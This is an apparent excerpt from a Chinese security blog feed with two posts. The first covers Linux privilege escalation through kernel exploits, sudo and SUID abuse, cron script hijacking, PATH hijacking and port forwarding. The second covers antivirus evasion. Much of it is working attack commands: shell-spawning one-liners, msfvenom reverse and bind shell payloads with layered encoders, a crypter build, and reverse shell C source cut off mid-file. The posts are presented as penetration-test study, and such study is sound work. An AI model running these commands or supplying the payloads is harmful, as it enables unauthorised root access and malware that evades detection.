    <content type="html"><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p><p>，要判断我们应该先对系统相关的信息进行收集。</p><h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul><li>已经拿到低权限shell</li><li>目标系统上有gcc</li><li>有上传文件的权限</li></ul><p><strong>使用命令</strong>：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p><p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p><p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p><p>这里在推荐一个很好用的工具</p><h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p>举个例子：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ perl ./Linux_Exploit_Suggester.pl -k <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Kernel local: <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] semtex</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: www.exploit-db.com/download/<span class="number">25444</span>/‎</span><br><span class="line">[+] memodipper</span><br><span class="line">   CVE<span class="number">-2012</span><span class="number">-0056</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/exploits/18411/</span></span><br><span class="line">[+] perf_swevent</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/download/26131</span></span><br></pre></td></tr></table></figure><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul><li>找到具备利用条件的exp</li><li>上传源代码</li><li>编译exp后执行</li></ul><h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：</span><br><span class="line">漏洞编号：CVE<span class="number">-2016</span><span class="number">-5195</span></span><br><span class="line">漏洞名称：脏牛（Dirty COW）</span><br><span class="line">漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</span><br><span class="line">影响范围：Linux kernel &gt;=<span class="number">2.6</span><span class="number">.22</span> 并且Android也受影响</span><br></pre></td></tr></table></figure><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p><p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p><p>passwd 文件：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p><p>以非root用户打开，提示没有权限。</p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul><li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li><li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li></ul><h4 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h4><p>sudo 是一个linux经常用到的命令，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 <strong>/etc/sudoers</strong>，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p><p><code>sudo -l</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p><p>可以支持所有命令，下面参考这个网址:</p><blockquote><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p></blockquote><p>这里以 awk、man 举例</p><p><strong>1、su</strong></p><blockquote><p>sudo su</p></blockquote><p>输入普通权限用户密码，切换为 root</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p><p><strong>2、awk</strong></p><blockquote><p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p><p><strong>3、man</strong></p><blockquote><p>sudo man man</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p><blockquote></blockquote><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote><p>ls -l /etc/cron*</p></blockquote><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p><p><strong>重写 python</strong></p><p>若这些计划任务的脚本可写，则编辑为 shell</p><p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p><p>测试：</p><blockquote><p>cat /etc/crontab</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p><p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p><blockquote><p>ls -al /tmp/1.py //查看是否有w权限 </p><p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p></blockquote><p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p><p>原本是没有 /tmp/sh</p><p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p><p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p><p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p><p><strong>防范：</strong> </p><p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p><p>​    suid提权：</p><p>​    利用拥有suid的文件执行命令，从而提升权限至root</p><h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>查找系统上运行的所有SUID可执行文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p><h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><p>交互模式可以通过执行Nmap参数” interactive “</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>以下命令将提供一个提升的shell。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">touch</span> <span class="string">pentestlab</span></span><br><span class="line"><span class="attr">find</span> <span class="string">pentestlab -exec whoami \;</span></span><br></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch getflag</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(serv</span><br></pre></td></tr></table></figure><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure><h4 id="环境变量劫持-SUID-扩展"><a href="#环境变量劫持-SUID-扩展" class="headerlink" title="环境变量劫持-SUID 扩展"></a>环境变量劫持-SUID 扩展</h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p><p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p><p><strong>测试：</strong></p><p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p><h4 id="docker-组提权"><a href="#docker-组提权" class="headerlink" title="docker 组提权"></a>docker 组提权</h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p><p>可以参考这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p><h4 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h4><blockquote><p>netstat -antup #查看各种网络服务 </p></blockquote><p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p><p><strong>1、redis 反弹 shell</strong></p><p>nc 单向转发</p><blockquote><p>nc -l 12345 | nc 192.168.191.170 80</p></blockquote><p>双向转发</p><blockquote><p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p></blockquote><p>双向转发本人测试失败，希望大佬们提供解决的办法</p><p>socat</p><p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p><blockquote><p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p></blockquote><p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p><blockquote><p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p></blockquote><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p><p><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux提权方法综述&quot;&gt;&lt;a href=&quot;#linux提权方法综述&quot; class=&quot;headerlink&quot; title=&quot;linux提权方法综述&quot;&gt;&lt;/a&gt;linux提权方法综述&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="linux提权" scheme="https://shu1l.github.io/tags/linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之免杀入门学习</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</id>
    <published>2020-04-28T13:18:46.000Z</published>
    <updated>2020-11-25T08:59:23.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装<ul><li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li></ul></li></ul><h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul><li>恶意程序最主要的防护手段<ul><li>杀毒软件/防病毒软件</li><li>客户端/服务器/邮件防病毒</li></ul></li><li>检测原理<ul><li>基于二进制文件中特征签名的黑名单检测方法</li><li>基于行为的分析方法（启发式）</li></ul></li><li>事后手段<ul><li>永远落后于病毒发展</li></ul></li></ul><h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密是的特征字符不可读，从而逃避AV 检测</li><li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器 cripter 的特征字符</li></ul></li></ul><h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul><li>恶意软件制造者<ul><li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li><li>使用独有 crypter 软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable 还最高追求 （FUD）</li></ul></li><li>AV 厂商<ul><li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li><li>一般新的恶意软件安全 UD 窗口期是一周左右</li><li>乐毅软件制造者永无休止的拉锯战</li><li>信的启发式检测技术尚有待完善(误杀漏杀)</li></ul></li><li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul><li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul><li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li></ul></li><li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li><li>在线多引擎查杀网站与 AV 查杀共享信息</li><li>搞黑的在线多引擎查毒站<ul><li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li>常用的 RAT 软件<ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul></li></ul><h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul><li>生成反弹 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure><ul><li>加密编码反弹 shell</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul><li>利用模板隐藏 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o c.exe</span><br></pre></td></tr></table></figure><ul><li>多重编码</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li><li>Hyperion （32bit PE 程序加密器）</li><li>Crypter / Container（解密器 PE Loader ）</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul><li>Windows reverse shell</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine gcc.exe windows.c -o windows.exe -lws2_32</span></span><br></pre></td></tr></table></figure><ul><li>Linux shell</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p><ul><li>linux_revers_shell.c</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: 192.168.153.166 4444\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span 